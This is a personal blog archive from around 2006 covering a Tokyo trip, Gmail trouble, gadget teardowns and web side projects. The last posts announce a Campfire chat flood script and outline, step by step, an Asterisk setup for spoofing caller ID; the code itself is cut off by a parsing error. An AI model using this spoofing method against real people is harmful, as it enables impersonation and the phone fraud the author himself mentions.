                <p>So i got gmail back this morning. had a bundle of mail that i didn&#8217;t get to see yesterday. weird. What was really annoying was that google didn&#8217;t respond and that there hasn&#8217;t been a response before. It just seems that they are ignoring a problem. Even if they were like &#8220;oh your email is broken until tomorrow&#8221; that would be better. it was rather frustrating..</p>

<p>maybe it is time to move to yahoo..</p>

<p>hah. nah. i like gmail.</p>

<p>stay tuned for my write up of windows on a macbook pro</p>

                <p>I am freaking out.. hah. my email isn&#8217;t really working right now. I foward all email i receive from harper @ nata2.org to my gmail account to use gmail as a simple reader. And this morning as soon as i got into work i am unable to access my gmail account. I can access my work gmail account. but not my primary one. I was also able to access it from home before i left for work. and now i can&#8217;t access it at all. I tried with my phone, the imac here and in different browsers (cookies cleared and all). I am worried a bit. What makes it all together more scary is that i am unable to see any messages if i pop into the account. weird&#8230; I guess this is why you don&#8217;t rely on others for services you could be providing yourself.</p>

<p>I hope that it comes back and isn&#8217;t a <a href='http://www.p2pnet.net/story/8124'>indicative of a larger problem</a>. All this comes right after nata2.org was invited to move its mail serving to gmail for domains. but i don&#8217;t know now.. scary..</p>

<p>I want the CL2 though.. They should give me my email back, give me CL2 and then we will all call it a day. Not having email is making me insane.</p>

                <p>Today was a long day. I have been going to bed so early and then getting up early. It has been nice. But I need to figure out the point of sleep moderation - or i need to get well. It seems that every day around 11 o clock i get kinda sick. Like my throat gets irratated and i cough a bit more. Probably just weak still from my fight with the cold. stupid cold.</p>

<p>Today i did a lot of work on extratasty.com. it has been easier and harder since we launched (i find my self saying a lot of things like that ~ easier and harder). what i mean is that havign the site done is nice and now we don&#8217;t have such a big thing hanging over us - but the problems that are left are much more complicated. I am excited to launch the shortcode and to launch the api. that will be a blast to write.</p>

<p>i was also able to get the intro/splash page done for the <a href='http://www.maxbarchicago.com'>maxbar site</a>. It was a nice/quick site to do. check it out. the bar itself is going to be really dope. we hope that the site matches it - i think it does.</p>

<p>I finally received my invitation to <a href='http://barbelith.com'>barbelith</a>. although i need another board like i need a hole in my head. i don&#8217;t need a hole in my head. and barbelith looks interesting even though i can&#8217;t possibly figure out how i would like to pronounce it.</p>

<p>Right now i have to call a cab so i can go home and sleep.</p>

                <a href='http://www.flickr.com/photos/natatwo/116388397/' title='Photo Sharing'><img title='tokyo 032206 016' src='http://static.flickr.com/39/116388397_dadbeb9f34_m.jpg' align='right' alt='tokyo 032206 016' /></a>
<p>So now that i am a little better (still spitting and coughing up scary stuff), i decided that it is time to blog up the time i had in tokyo. hah.</p>

<p>So i flew in to tokyo narita airport on the 17th of March (which is my parents wedding anniversary) and hiromi picked me up. We then took the train (around an hour and a half ride) to hiromi&#8217;s place. Hiromi lives in a rather small apartment - it is pretty awesome. It is two rooms stacked on each other, the bottom room has the kitchen, bathroom and laundry area and the top room is closets, bedroom and balcony. Its a pretty sweet little place and is apparently very different from most apartments in tokyo. The only thing scary about it - is the stairs from the bottom to the top - i would certainly fall down them if i lived there.</p>

<p>So anyway, i arrived and we just hung out that friday. i was pretty tired. hiromi cooked a really nice meal, which we ate. and then i went to bed. pretty early. The next day hiromi took me to a real nice park area and then on a cruise to see the <a href='http://www.flickr.com/photos/natatwo/114411589/in/set-72057594085151914/'>big lantern</a> at Asakusa Kannon Temple. It was big and there were some<a href='http://www.flickr.com/photos/natatwo/114413811/in/set-72057594085151914/'> big sandles</a> as well. The cruise was really nice. We rode in the craziest and <a href='http://www.flickr.com/photos/natatwo/114410781/in/set-72057594085151914/'>slowest anime boat</a> ever. Then we went to a really nice sea food resturant in Azabujuban . i had some excellent <a href='http://www.flickr.com/photos/natatwo/114413048/in/set-72057594085151914/'>sashimi </a>and some really <a href='http://www.flickr.com/photos/natatwo/114413283/in/set-72057594085151914/'>great scallops</a>. I also had about <a href='http://www.flickr.com/photos/natatwo/114412985/in/set-72057594085151914/'>1 billion drinks</a>. I about passed out at the restaurant due to my sleep deprivation issues so we scurried on home. The trains in tokyo are clean, fast and always on schedule. So going home is easy and crowded ;).</p>
<a href='http://www.flickr.com/photos/natatwo/114556833/' title='Photo Sharing'><img title='Traditional punk rock japan' src='http://static.flickr.com/40/114556833_371ae95872_m.jpg' align='left' alt='Traditional punk rock japan' /></a>
<p>Later that night we ended up going to a family resturant and eating. It was like a denny&#8217;s or IHOP - but it was ran by a button(whenever you needed to contact a waitress you pressed a button). I had a really bad stew, but the potatoes and the gravy was awesome. We then went home and i tried to take a nap but ended up waking up the next day. hah.</p>

<p>The next day we went to the craziest place ever. <a href='http://www.flickr.com/photos/natatwo/tags/akihabara/' class='Grey'>Akihabara</a>. This was a place of dreams. It was full of crazy electronics, crazy girls dressed as maids and the weirdest stores ever. I spent a lot of time at the robot kingdom and the radio building part 2. I loved the component stores - it was my dream place. i always need those things and i dispise radio shack and i want them faster then ordering could help - so akihabara is my place apparently. and if i get thirsty i can go have a maid feed me&#8230; wtf.</p>

<p>Hiromi then took me to an excellent noodle shop. a really great place. I had the <a href='http://www.flickr.com/photos/natatwo/115240541/in/set-72057594085151914/'>noodles that you dip into a nice broth</a>. It ruled. My legs about snapped from sitting on them, but yea. it ruled. We then went to a nice sweets place tohave traditional japanese sweets. It was really interesting. haha. I liked it but i wasn&#8217;t really into the sweets as much as hiromi was. I had these weird (WEIRD!!) <a href='http://www.flickr.com/photos/natatwo/115240609/in/set-72057594085151914/'>jellies and red bean paste</a>. Quite good, but bad if you though the red bean paste was ice cream. hah. That night we went to most awesomest fast food resturant: <a href='http://www.google.com/url?sa=t&ct=res&cd=1&url=http%3A//www.mos.co.jp/&ei=L8ouRMhCgqSlAs2W8dgK&sig2=JoescUCANDgU61w0Zo9TDQ'>mos burger</a>. it was awesome. I had this <a href='http://www.flickr.com/photos/natatwo/115838078/in/set-72057594085151914/'>little hamburger</a> that had a sloppy joe-ish sauce, cheese and a tomato. It was easy and good. And not too expensive. I really liked it. It was also right by hiromi&#8217;s house and hiromi was able to eat there (being vegan+fish). So that was nice. Oh yea.. that day hiromi bought an electronics kit at robot kingdom and so she <a href='http://www.flickr.com/photos/natatwo/115837946/in/set-72057594085151914/'>put it together</a> with very little help from me. I will turn her into a nerd yet.</p>

<p>On tuesday, my 28th birthday, Hiromi took me to <a href='http://www.flickr.com/photos/natatwo/115839463/in/set-72057594085151914/'>elvis ramen</a> (on <a href='http://www.stevebrownismyhero.com/'>steve brown's</a> excellent recommendation). It was amazing. They had, like many places in japan, a vending machine that dispenses the ticket that gets you your food. Unfortunantly, due to my lack of japanese reading, i wasn&#8217;t able to read the menu - but hiromi picked out an <a href='http://www.flickr.com/photos/natatwo/115838414/in/set-72057594085151914/'>amazing ramen dish</a> for me. So good. I think that is the food i miss the easiest - it is something i could potentially see myself eating often. The best part was that it was called elvis ramen and there was no reason. No elvis effigy or picture or anything. Nothing. Just the name. awesome.</p>

<p>After the elvis ramen, hiromi took me to the tokyo station to get a head massage. It was hilarious. Because i don&#8217;t speak japanese and the masseuse doesn&#8217;t speak english. So i had no idea what was going on or what i was supposed to be doing. Basically i just laid there and she massaged my head and back. It was fun. Hilarious even. Hiromi had purchased me a <a href='http://www.amazon.com/gp/product/0345479211/sr=8-1/qid=1143930494/ref=pd_bbs_1/102-8138382-2132104?%5Fencoding=UTF8'>crazy scifi book</a> for my birthday so i read that while hiromi got a massage. I think hers was better than mine - probably due to the ability to converse and communicate.</p>

<p>My birthday was a weird day in tokyo - because it was a national holiday(spring equinox?) and everything was closed/holiday hours. We just helled about and went to really neat stores and neighborhoods. It was quite amazing really. I don&#8217;t usually get to see stores like that. So hiromi found this really great italian place called <a href='http://www.flickr.com/photos/natatwo/115839618/in/set-72057594085151914/'>Via Nuova Rondo</a>. It was a small italian place that served a great 3 course meal. It was really awesome. I love japanese interpreted italian food. Some of the best foods ever. ;) After the resturant we walked around tokyo and looked at stuff ;) it was pretty awesome.</p>
<a href='http://www.flickr.com/photos/natatwo/116389646/' title='Photo Sharing'><img title='tokyo 032206 029' src='http://static.flickr.com/43/116389646_56a7868bf6_m.jpg' align='right' alt='tokyo 032206 029' /></a>
<p>So anyway. Hiromi brought me to the Kamakura Daibutsu in kamakura. So cool. It is a giant buddha and is really quite big (as you may be able to tell from the quarter i am holding up to demonstrate scale). We were able to walk around the grounds and even go inside it. So cool. The town was really nice. A smallish tourist town - seemingly really legit. There was a really nice temple and quite a few nice places to see. There was a light exhibit - but i sadly wasn&#8217;t able to go (stupid birthday). We walked around and i took a bunch of pictures.</p>

<p>Hiromi then took me to a conveyeur belt suchi place. So so good. I love sushi and it was awesome to sit at a legit sushi bar and eat sushi made from a legit sushi chef. Really awesome. I had some really really good bonito, some great tuna and <a href='http://www.flickr.com/photos/natatwo/116382257/in/set-72057594085151914/'>awesome salmon</a>. So good. I loved it.I am glad hiromi took me there.</p>

<p>After that we walked around a bit and went to the temple and chilled. So nice and calm. I really loved the colors there and the weather was great. We then took the train back to tokyo. I read my crazy book and hiromi napped.</p>

<p>That night was awesome. We went to a fun sumo resturant that served <a href='http://metropolis.japantoday.com/tokyofooddrinksarchive349/302/tokyofooddrinksinc.htm'>Chanko Nabe</a>. It was awesome because we had so much good food and really great people. Hiromi had invited some of <a href='http://www.flickr.com/photos/natatwo/116395781/in/set-72057594085151914/'>her friends</a> to hang out. They were really cool and fun. They brought us to <a href='http://www.insite-tokyo.com/column/douglas/index4.html'>Kabukicho</a> to drink at a nice bar. We had <a href='http://www.flickr.com/photos/natatwo/116395629/in/set-72057594085151914/'>japanese bar food</a> and awesome drinks. It was so fun.</p>

<p>On thursday, I was feeling a bit sensitive to the time left - so i made hiromi take me back to akihabara to grab some <a href='http://images.google.com/images?q=gatcha+gatcha&btnG=Search'>gatcha gatchas</a>. Such a weird place. ;) Then we ran back to hiromi&#8217;s place, grabbed lunch at mos burger. That afternoon we went to the coolest museum in tokyo: the <a href='http://club.nokia.co.jp/tokyoq/weekly_updates/tqoole/parasite.html'>Meguro Parasitological Museum</a>. It was amazing. All parasites. Really freaky. and kinda gross. But awesome. totally totally awesome. Then we hooked up with a yoyo friend named <a href='http://www.google.com/url?sa=t&ct=res&cd=1&url=http%3A//www.officeblack.com/&ei=HAYvRJWEN6jeqALHgLXECg&sig2=2LP0LbjBk-s1vCa4JtOFMA'>black</a>. He took us to a really amazing restaurant called <a href='http://club.nokia.co.jp/tokyoq/weekly_updates/tqoole/christon.html'>christon cafe</a> in shibuya. It was black&#8217;s favorite place to take special guests (i.e. girls). We had an excellent meal and some excellent conversation. So fun. <a href='http://www.flickr.com/photos/natatwo/116790789/in/set-72057594085151914/'>Black </a>got me a <a href='http://www.flickr.com/photos/natatwo/116791690/in/set-72057594085151914/'>secret birthday cake</a>. It was hilarious. totally a surprise. Then <a href='http://www.flickr.com/photos/natatwo/116790711/in/set-72057594085151914/'>hiromi and i</a> headed back.</p>

<p>On friday we went to <a href='http://www.yamanashi-kankou.or.jp/english/'>yamanashi</a> - which is where hiromi grew up. We had lunch at a neat resturant with her parents and i saw her home town. It was really nice. Hiromi and i are both from areas close to mountains. Heh. very similar places. Although in drastically different climates ;). One thing about growing up around mountains - it rather easy to forget that they exist. They become just the pretty background to your life. heh.</p>

<p>We then took the bus back to tokyo and ate onigari. So good. I read my book. and hiromi read and slept. It was neat to see the countryside. It is so very different then tokyo. So much quieter. it was very nice.</p>

<p>The next day i left and flew to chicago. So long.</p>

<p>All in all tokyo rules. it was awesome to see hiromi and to visit her country. Quite different from mine ;). You can see the rest of my <a xhref='http://flickr.com/photos/natatwo/sets/72057594085151914/'>pictures on flickr</a>. I took quite a bit and there are some fun ones.</p>

                <p>Man. i got up today at 6:30. WTF. That is not normal. and i am sick. i have a running nose, a stomach ache and my throat is scratchy. Sad. I hope this passes&#8230; the getting up early not the sickness.</p>

<p>Last night i finished up the first draft of my ambient device. it is pretty ghetto - but i am doing some cool stuff. I am running the RGB from the RGB controller to my LEDs with 4 wire phone cord. heh. It is easier and cheaper that way. It looks cool and works pretty well. I need to move on the ambient agent.</p>

<p>I also had an idea this weekend. I think i am going to make a quick and easy site that allows people to call a number in their locale that then dials a random number in the US. hah. As an art project.</p>

<p>I am wearing my <a href='http://www.popsike.com/pics/sth004/20030626/2541628056.jpg'>seditionaries knock off shirt</a> today. I wonder <a href='http://www.google.com/search?q=define%3A+homophobia'>what people will think</a>. I wish <a href='http://www.flickr.com/photos/natatwo/118752856/'>mine</a> was the right colors. heh. but it is a famous shirt and i am wearing a knock off from tokyo. hah. i am not quite sure what to think.</p>

<p>i just turned off both alarms an hour before they are supposed to go off. i imagine i will crash hard in like 5 hours. and need a nap at work. eep.</p>

                <p>The flight was long. I mean&#8230; LONG. I was sleepy so i slept all the way. but i still got bored on the plane. I really needed to bring a book - but it was dark and i didn&#8217;t want to wake up my neighbors. but i made it. Immigtation was sooo easy. They just said ok.</p>

<p>I just got to hiromi&#8217;s house. It is really tiny. two rooms - stacked. Nice though. I don&#8217;t think i have ever seen anything this small in regards to a living space. However hiromi&#8217;s place is really nice - it has a balcony and a second floor. all tiny. like japan. hah.</p>

<p>The trains are crazy.</p>

<p>More later. i need to start taking pictures. too bad shozu doesn&#8217;t work. hmm.. maybe i will have to get a vodaphone wcdma card&#8230; then maybe shozu will work. hah. probably not. ot it will work for 1 minute. heh.</p>

                <p>So this weekend was pretty cool. On friday i took a long nap and went to smart bar with kira. Mark verbos was doing his live P.A. bit. It was pretty awesome. I really like the knob tweaking and acidish noise that occurs whenever mark does his thing. The new smartbar is really dope. Crazy lighting, and an incredible sound system. Seriously. and INCREDIBLE sound system. It is massive. Nice work on that. After mark finished we headed out and went back to the hood. I went to bed. and woke up late on saturday. Internet was out at my house - so i went to work and noticed that the phones were all down. so i check them out and the asterisk box was totalled. weird. So i redid it. and got back home this morning at around 6am. I talked to hiromi for about an hour. then went to bed.</p>

<p>now. i have lost the steam to continue.</p>

                <p>The last couple weeks have been ultra nerdy. It has been great. I got my gumstix and have been rocking that - attempting to get a handle on how i am going to make that work. It doesn&#8217;t seem like it will be all that hard to theoretically make. I am worried about having to prototype a daughterboard for the gunmstix - since i haven&#8217;t ever really made a circuit board in real life. i mean - i made stuff in college, but it was all in theory and never left the computer. Check out my progress at <a href='http://www.ambientagent.com'>ambientagent.com</a>.</p>

<p>On monday in a fit of scattered experimentation i went ahead and created a fake myspace account purely to see how many friend i could get in a day. I signed up and immediately added myself to one of those rediculous friend trains. It is basically a website where you submit your myspace uin and it lists it in a bulletin that you are able to post to myspace. once you are added to the bulletin - then others add you to their account. Using this i was able to get an amazing number of &#8220;friends&#8221; in 24 hours. In the end i had about 242 friends. Hah. So i made a simple myspace train myself - <a href='http://www.bitchmech.com'>bitchmech.com</a>. It has yet to gain the momentum i think it needs - but its hilarious. someday. i will have 1 million friends.</p>

<p>So i have been working on creating a dope php application framework. I have giving my first draft to <a href='http://www.broox.com'>derek</a> and am waiting his response. someday broox and i will create something interesting. hopefully it will also make us 1 million dollars. one for each of my fake myspace friends.</p>

<p>I am writing a 3 part blog about podcasting over at the <a href='http://www.skinnycorp.com/blog/'>skinnyBlog</a>. Check it out here: <span /><a href='http://www.skinnycorp.com/blog/14/how_we_podcast_part_1_3_the_equipment'>How we podcast. Part 1/3: The equipment</a>. I am going over our journey creating our podcast and what we do to make it oh so good. It will be awesome. Tomorrow I will be covering our studio and then later i will be covering the podcast structure and design. We are podcasting professionals. hah.</p>

<p>I leave for Tokyo in a week. I am rather exciting. It will be really nice to see hiromi. i miss her quite a bit and would love it if she lived around here. but our world of sip phones and internet chatting is going to have to do for a minute. stupid ocean.</p>

<p>I think i am going to import some old pictures into flickr. orgazmo is an amazing movie.</p>

                <p>So yesterday i worked a lot. It was awesome. I enjoy being in a position where i really like what i am working on. It makes staying on task that much easier. In the past, when i was working at other companies, i would often have to work on two or three things of my own just to pass the time between real work and meetings and all that corporate crap that occurs at companies that are really old or really dumb. But now - working on awesome things..</p>

<p>Anyway.. yesterday was awesome. a dream for a nerd like me. I got up. Got to work. Worked on an <a href='http://www.extratasty.com'>awesome site</a> until lunch. <a href='http://metromix.chicagotribune.com/dining/63960,0,1867412.venue'>Ate a good lunch</a>. Worked on an <a href='http://stompboxnetworks.com/'>embedded linux box</a> until 6. Then tried to fix bugs on ET until 8ish. then rocked out on some of my personal sites until 2:30. hah.</p>

<p>so yea. work is awesome.</p>

<p>but i am sleepy. and want to lay down. ;)</p>

<p>I will get the stompbox working today!</p>

                <p>As you probably noticed, i was at work late last night. As usual, My coworker andrew was also here. Often when it is just the two of us - we theorize and talk about everything that is going on like two old stoners in a VW van. Its nuts. We cover everything from office politics to why stars are green. hah. Anyway, last night andrew said a couple of things that made me really think.</p>

<p>First, he mentioned myspace and we started talking about how its crazy and it led us to talk about how myspace will affect the upcoming elections. OMG. seriously. myspace scares the hell out of me. it is an insane collection of culture and quite possibly one of the biggest single organizations in the world. Where else could one corporation make a change to a site and probably effect the votes/feelings of like 100 million kids. imagine if myspace became ultra politicized. Imagine if in this upcoming election, politicians started campaigning to the 18+ on myspace (oh they will - if they are smart). What if we got half of them to vote. that would be more than the voting ration of the entire us. hah. Oh yea. Myspace is owned by fox. Good bye democrats :( The second thing we talked about was success. We were talking about our amazing employer and how Threadless is really successful. One of the things andrew said was &#8220;why are people trying to be myspace, why don&#8217;t they try and be the level threadless is.&#8221; and &#8220;just try and make something that works.&#8221; I agree so much with this. this to me is the mantra of the <a href='http://www.paulgraham.com/web20.html'>web 2.0</a> movement. This is what Jason at <a href='http://www.37svn.com'>37signals </a>seems to be <a href='http://37signals.com/svn/archives2/it_just_doesnt_matter.php'>ranting about</a>. Don&#8217;t concentrate on making sure that your users can upload targa photos, jsut make it so they can <a href='http://www.flickr.com'>upload jpgs really well</a>. Scale the features back so that the site is usable for what it is supposed to be usable for. Don&#8217;t add every feature possible. Don&#8217;t over extend your poor little site. This is hard. hah.</p>

                <p>Seriously. It is killing me. I am rather frustrated.</p>

<p>So i was reading russell&#8217;s post on flash lite and was like &#8220;yippee.. more s60 software for my shiny n70.&#8221; and i clicked his fancy link to macromedia.com page to &#8220;buy&#8221; the software. Well. after filling out 30 goddamn forms and clicking all around this really stupid flash app - i finally got to a place where i can download the file. So i click it and it is blocked by IE. to unblock it i had to &#8220;refresh&#8221; the page. which means that macromedia lost all memory of my purchase. wtf. no state. no session. i HATE flash. it is completly unusable. So i click around. trying to find out how to get my purchase and i find a accessibility link. so i right click it. but nooo&#8230; its flash. i can&#8217;t open it in a new window. i have to leave the shopping area. retarded. luckily i get an email from them detailing how to download my purchase. but.. much to my chagrin - the only way is to log in, and find your purchase. not like those other &#8220;html&#8221; sites where there is a nice long link you can click.. that would be too easy.</p>

<p>goddamn i can&#8217;t explain how much i hate flash as an application language. go make banner ads.</p>

                <p>I got my gumstix today and was lauding the fanciness of the smallest comptuer i have EVER seen, explaining to my coworker Dan how i was going to build an <a href='http://www.ambientdevices.com/'>ambient orb</a>/<a href='http://nabaztag.com/'>nabaztag </a>like device that will integrate with my <a href='http://www.nokia.com/n70'>bluetooth phone</a> and my <a href='http://asteriskathome.sourceforge.net/'>pbx</a>. he was impressed of course ;) - and told me that our coworker jake already had a <a href='http://nabaztag.com/'>nabaztag</a>. I was like &#8220;WOAH.&#8221; Those little punks are hard to get here in the states. So i talked to jake and he brought it in for lunch.</p>
<a href='http://www.flickr.com/photos/natatwo/105460276/in/photostream'><img src='http://static.flickr.com/44/105460276_f112fd265d_m.jpg' align='right' /></a>
<p>When we got it - it wasn&#8217;t booting correctly, saying there was a problem by flashing yellow. hah. It coudln&#8217;t find its home WIFI net and obviously couldn&#8217;t access <a href='http://www.skinnycorp.com'>skinnyCorps</a>. So i looked at all the documentation and found that it is REALLY easy to fix. All you do is unplug it, hold the top button down, plug it in and then access the nabaztag wifi network. Then load up your browser and access the webpage for easy nabaztag configuration - including a nice &#8220;scan networks&#8221; feature. Personally I feel that this is one of the coolest features of almost any wifi gadget out there. Could you imagine if the Airport express was as easy to setup, or those bastard wifi cameras? I mean really. How mcuh time could i have saved instead of unhooking the camera and plugging it into ethernet. So much time.</p>

<p>Anyway. So while we were trying to get it to work, jake let me know that it had been thrown and may have been broken. How sad. So i immediately offered to take it apart and fix er up. So I did</p>
<!--more-->
<p>First i took off the top. It was a pain in the ass. They used these crazy triangle screws. They were not easy. Once that was off i was able to peer into the nabaztag and see the innerworkings. <a href='http://www.flickr.com/photos/natatwo/105439338/in/set-72057594071598078'><img title='Nabaztag with its shell off' src='http://static.flickr.com/37/105439338_1b1709d48b_m.jpg' alt='Nabaztag with its shell off' /></a></p>

<p>As you can see its pretty simple. We have four LEDs, a speaker, two motors and two switches (one on the back, one on the top). By the way, The fact that the ears are magnetic is amazing.</p>

<p>The board is rather sparse. i wasn&#8217;t able to make out any processor detail - although i imagine it is some embedded platform. It was using a benq pccard wifi adapter.</p>
<a href='http://www.flickr.com/photos/natatwo/105455837/in/set-72057594071598078/'><img src='http://static.flickr.com/37/105455837_8918b4e646_m.jpg' /></a>
<p>I was a little surprised by the use of such common hardware in a consumer device. Maybe not actually surprised - but surprised that they obfuscated it. They could have easily exposed the hardware and made the marketing decision to sell it as upgradable.</p>

<p>One thing i didn&#8217;t get a chance to experiment with is the <a href='http://www.flickr.com/photos/natatwo/105455653/in/set-72057594071598078/'>port on the side of the circuit board</a>. It would be awesome to get shell on my nabaztag. I will investigate more soon- if anyone has any hints, let me know.</p>

<p>I have an ass load more pictures up on my flickr set: <a href='http://www.flickr.com/photos/natatwo/sets/72057594071598078/'>nabatag take-apart</a> or <a href='http://nata2.org/photos/album/nabaztag-take-apart/'>here</a>. I have a <a href='http://www.youtube.com/?v=m7e7SROteng'>video on youtube</a> as well (excuse my coworkers please). So. After reseating the switch and making sure it worked. I put it all back together. Putting stuff together always reminds me of when i was little and i woudl take apart everything - my father told me &#8220;Harper, someone with true skill can put it back together.&#8221; So true. My problem was that I always ended up with an extra piece. Anyway.. After it worked i decided to take a look at the API offered by nabaztag. It is pretty dope. Just a clean rest api. It reminded me of the ambient devices one - but the nabaztag being wifi and havign a speaker made it just that much cooler. So i read it over and then wrote this really silly php tool/interface for their API. Check it out here: <a href='http://dopeman.org/nabaztag/'>Nabatag API Interface</a>.</p>

<p>Awesome. Let me know if that works for you.</p>

<p>In other words and other worlds - i attempted to use monowall to jumpstart my box. however - it didn&#8217;t work, they don&#8217;t have a shell to log into. but, monowall is DOPE. man. i was so impressed with how easy it was to configure. i want to buy a soekris board and use it instead of my linksys wrt54g. it wouldn&#8217;t be hard at all - and it should be really robust. it looked fast and it was so nice to configure. hmm&#8230;</p>

<p>how i love me the unixes.</p>

<p>i like having comments on my blog. it allows me to kinda interact with some peeps. haters and all.</p>

                <p>I have been watching the shittiest TV lately. It is horrible. horrible. I watched 4 hours of hallmark tv. first a movie about christmas and then some movie about some heart wrenchy crap. it was so bad. so i changed channels and watched TNT. First i watched <a href='http://imdb.com/title/tt0113845/'>money train</a>, then <a href='http://imdb.com/title/tt0105104/'>passenger 57</a> and then i watched a bunch of the <a href='http://www.logoonline.com/'>logo network</a>. The logo network has such interesting documentaries. Right now i am watching a <a href='http://imdb.com/title/tt0462757/'>documentary about butch lesbians</a>. it is awesome.</p>

<p>It is so interesting how almost every parent in this documentary says that their child being a lesbian is just a phase. It is pretty interesting. I don&#8217;t quite know what i think of that. So strange.</p>

<p>I need to get my <a href='http://www.mrbling.com'>grill done</a>. Yall should buy me some. DO IT.</p>

                <p>I made it a bit more user friendly, made it a bit more web 2.0 and really fixed up the backend. The biggest change is that i added youtube content and added all my nata2.info pictures. I want to start doubling my nata2.info income. hah. maybe by replicating the site. haha. we shall see.</p>

<p>The reason i did this - is i have been playing around with a php framework that i want to use for my future sites - and i needed a place to try it out. so yea. word.</p>

<p>Anyway. i need to go home. i am still at work. ;) i like this computer better than my laptop.</p>

                <p>I need some new sites. Speaking of which - I am making a new site: geopoli.com. It is a geotargeted political banner ad and text ad delivery site. I want to make it so you can include a dynamic image or JS code snippet on your blog or myspace profile and it will display to your users a text ad or banner ad saying &#8220;YOU LIVE IN CHICAGO. SEND OBAMA an EMAIL.&#8221;</p>

<p>The idea is that when the user clicked on the ad it would take the user to a place that would allow the user to contact their representative. i want it to be unpartisan and sorta non-issue based - so that people are not specifically using it to badger users.</p>

<p>I feel that this coming spring, summer and fall -being politically active will be very important. After listening to <a href='http://www.thisishell.net'>this is hell</a> for a couple weeks and reading a bunch - i have decided that the US is on the brink of destroying the world. if we attack iran, the world as we know it will be over. and i feel that the only we can get our representatives to pay attention is to bitch at them a bit. and i think places like myspace are a great place to gather some momentum. and the first part of momentum is showing people who they are representated by.</p>

<p>So i have written a basic test to tell you where you are from. i am using the <a href='http://www.hostip.info'>hostip.info</a> database, it is nice but sadly inadequate. It works pretty well - but it doeasn&#8217;t quite cover everything. But i have written a really nice (if i may say so myself) class to interact with whichever geo-ip system i choose. the only problem i have now is that i am unable to grab the zip-code from the ip with good precision. that isn&#8217;t such a problem - i am able to get a pretty high level idea - but it would be nice to be able to hit closer to the user. To solve this i am correlating the lat/long from the geo-ip lookup with the <a href='http://zips.sourceforge.net/'>freeware zips database</a>. its rough and slow but it works pretty well.</p>

<p>The second problem i am facing is that i need a place to driect the users who see the ads. where should i redirect them. i was thinking to congress.org - but it seems kinda sketchy. not bad sketchy - but i don&#8217;t trust something i don&#8217;t understand completely. And they have weird terms of service which i am sure i would inadvertently break.</p>

<p>So that is what i am thinking of. what i am doing. and how i am doing it. I want it to be no more complicated than making a flickr badge - and no less functional. It needs to be able to interact and intrigue the user.</p>

<p>i think its a cool idea.</p>

                <p>and sleep deprevation is destroying my ADD.</p>

<p>I really feel that ADD helps me work on all my projects. For instance today: I worked on extratasty for 3 hours, I played with the stompbox and the verizon card for 3 hours and I did &#8220;research&#8221; on some other projects (jacobs sync hah) for awhile. But - it wasn&#8217;t really in blocks like that - it was threaded. So everything was happening at once.</p>

<p>I do think that this can get confusing and can lead to not being very productive - i just have to make sure that i am on track with everything.</p>

<p>hah.</p>

<p>whew. i am really sleepy. and i am watching really weird TV. I just watched will and grace, some other show which i forgot, two episodes of the golden girls and now the nanny. Rather than sit through fran drescher, i am going to go to bed. eep.</p>

<p>my house is incredibly lonely right now. Ever since all my roommates moved out - its just me and the remenents of matiss. Quite weird. i spend almost every night by myself hanging out with my laptop and TV. The only thing that sucks is that i don&#8217;t have the motivation to really make my place look better or be cleaner - but i get annoyed by the mess. eeek. i need some roommates stat. or i need to move. but i HATE moving. HATE IT.</p>

<p>I am really excited for japan in march. Today is hiromi&#8217;s birthday. Stupid japan being so far. It would have been nice to be around her for her birthday. but yea can&#8217;t win then all.</p>

<p>Tonight, however, i learned how to use pulse wave modulation while programming BASIC STAMPS. heh. it was fun. i made my <a href='http://flickr.com/photos/natatwo/102881174/'>LEDs fade in and fade out</a>. I am preparing for my gumstix. I am planning on making a bluetooth aware led light with some audio to interact with me and my environment. It is pretty exciting. I am worried that i am about to submerge my head about 2 feet under water. trouble. but at least i will get ambient led light part to work.</p>

<p>awesome</p>

<p>I have an incredible growth in my nose. i think it is snot. It may just be a zit inside my nose. it hurts. Hopefully it will go away. if it won&#8217;t maybe i will visit jeffrey&#8217;s dermatoligist and get that shit lanced. haha.</p>

<p>We are going to start blogging about work. I am pretty excited. Hopefully it will be less random and ranty than this one. or wait. whatever. i need to sleep a minute to collect my thoughts. then rock it.</p>

                <p>Oh yea. I forgot to mention that i released a new version of my campfirenow.com bot framework. It is quite a bit better and a lot more robust - however i imagine that 37signals has changed things to stop it.</p>

<p>Check out the source: <a href='http://nata2.info/?path=code%2Fcampfire_bot_hack'>here</a></p>

<p>I also released a proof of concept flood. its real annoying and stupid. don&#8217;t use it. i just wanted to see if i could make it.</p>

<p>Flood source: <a href='http://nata2.info/?path=code%2Fcampfire_bot_hack&text=campfire_flood.pl'>here</a></p>

<p>A couple things:</p>

<p>I really think that campfire should have some sort of authentication scheme to make sure that the message originator is the right user. It wouldn&#8217;t stop bots and what not, but it would stop the tinyurl hack that is always hilarious. I think that have super AJAXy sites and insuring simple app security is often more difficult - but in my opinion, more important because the feel of the application is more similar to the desktop applications and so the user may be caught off guard if a security breach rares its head. But as Jason Fried said: <a href='http://37signals.com/svn/archives2/it_just_doesnt_matter.php'>it just doesn't matter</a>.</p>

<p>I wonder if gtalk could be similarly exploited. I doubt it since it is based on the jabber client and xmpp. I wonder why 37s didn&#8217;t use xmpp or something.</p>

<p>awesome</p>

                <p>I have cleaned up and commented a little hack i did for my home asterisk server - allowing a person to dial an extension and then be walked through spoofing caller id on a call. It is a ridiculously easy hack to engage. I was surprised and a bit concerned at what this means in regards to trust and telephony. I mean, if a hobbyist is able to spoof caller id on a phone call to anywhere with nothing more than <a href='http://asteriskathome.sourceforge.net/'>asterisk@home</a> and <a href='http://www.vmware.com/products/server/'>vmware</a>.. what is to stop someone from setting something like this up and stealing credit cards or social security numbers using some crazy <a href='http://en.wikipedia.org/wiki/Social_engineering_%28computer_security%29'>social engineering</a>.. i guess nothing..</p>

<p>So anyway, i released <a href='http://asteriskathome.sourceforge.net/'>my source code</a>. It is really really simple and based entirely on one small block of code. The basic idea is: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;&lt;small&gt;&lt;/small&gt;</pre></p>
<small>
<ol>
	<li>Prompt user for input (spoofed number)</li>
	<li>Grab 10 digits (spoofed number)</li>
	<li>Prompt user for input (number to call)</li>
	<li>Grab 10 digits (number to call)</li>
	<li>Set caller idea based on input in step 1 and 2</li>
	<li>Make call to number from input in step 3 and 4</li>
</ol>
</small>
<p>As you can see the idea is pretty simple. get input. set callerid. make call. The code is just as simple: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
